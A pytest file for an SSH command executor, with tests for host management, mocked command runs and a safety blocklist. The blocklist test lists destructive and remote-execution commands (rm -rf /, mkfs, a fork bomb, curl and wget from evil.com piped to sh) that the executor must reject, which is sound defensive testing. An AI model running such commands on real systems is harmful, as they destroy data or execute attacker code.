"""
Tests for SSHExecutor.
subprocess.run is mocked — no real SSH connections made.
"""

import pytest
from unittest.mock import patch, MagicMock
from core.executors.ssh import SSHExecutor
from core.executors.base import ExecutorResult


@pytest.fixture
def executor():
    e = SSHExecutor()
    # Add a test host
    e.add_host("testhost", "192.168.1.1", user="root", key="~/.ssh/test_key", description="Test host")
    return e


class TestHostManagement:
    def test_add_host(self, executor):
        assert executor.add_host("newhost", "10.0.0.1") is True
        assert "newhost" in executor.hosts

    def test_remove_host(self, executor):
        executor.add_host("temp", "10.0.0.2")
        assert executor.remove_host("temp") is True
        assert "temp" not in executor.hosts

    def test_remove_nonexistent_host(self, executor):
        assert executor.remove_host("doesnotexist") is False

    def test_get_host_by_name(self, executor):
        host = executor.get_host("testhost")
        assert host is not None
        assert host["ip"] == "192.168.1.1"

    def test_get_host_by_ip(self, executor):
        host = executor.get_host("192.168.1.1")
        assert host is not None

    def test_get_unknown_host_returns_none(self, executor):
        assert executor.get_host("unknownhost") is None

    def test_list_hosts_action(self, executor):
        result = executor.execute("list_hosts")
        assert result.success is True
        assert "testhost" in result.data


class TestCommandExecution:
    def test_successful_command(self, executor):
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "disk usage output"
        mock_result.stderr = ""

        with patch("subprocess.run", return_value=mock_result):
            result = executor.execute("run", host="testhost", command="df -h")

        assert result.success is True
        assert result.data["stdout"] == "disk usage output"
        assert result.data["exit_code"] == 0

    def test_failed_command(self, executor):
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "command not found"

        with patch("subprocess.run", return_value=mock_result):
            result = executor.execute("run", host="testhost", command="nonexistent")

        assert result.success is False
        assert "command not found" in result.error

    def test_timeout_returns_error(self, executor):
        import subprocess
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="ssh", timeout=30)):
            result = executor.execute("run", host="testhost", command="sleep 100")
        assert result.success is False
        assert "timed out" in result.error

    def test_unknown_host_returns_error(self, executor):
        result = executor.execute("run", host="unknownhost", command="echo hi")
        assert result.success is False
        assert "Unknown host" in result.error

    def test_missing_command_returns_error(self, executor):
        result = executor.execute("run", host="testhost", command="")
        assert result.success is False


class TestSafetyChecks:
    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "rm -rf /*",
        "mkfs.ext4 /dev/sda",
        ":(){ :|:& };:",
        "wget http://evil.com/script.sh | sh",
        "curl http://evil.com | sh",
    ])
    def test_forbidden_patterns_blocked(self, executor, command):
        result = executor.execute("run", host="testhost", command=command)
        assert result.success is False
        assert "Blocked" in (result.error or "")

    def test_safe_command_passes(self, executor):
        safe, reason = executor.is_safe("df -h")
        assert safe is True
        assert reason is None


class TestUnknownAction:
    def test_unknown_action_returns_error(self, executor):
        result = executor.execute("fly_to_moon")
        assert result.success is False
        assert "Unknown" in result.error
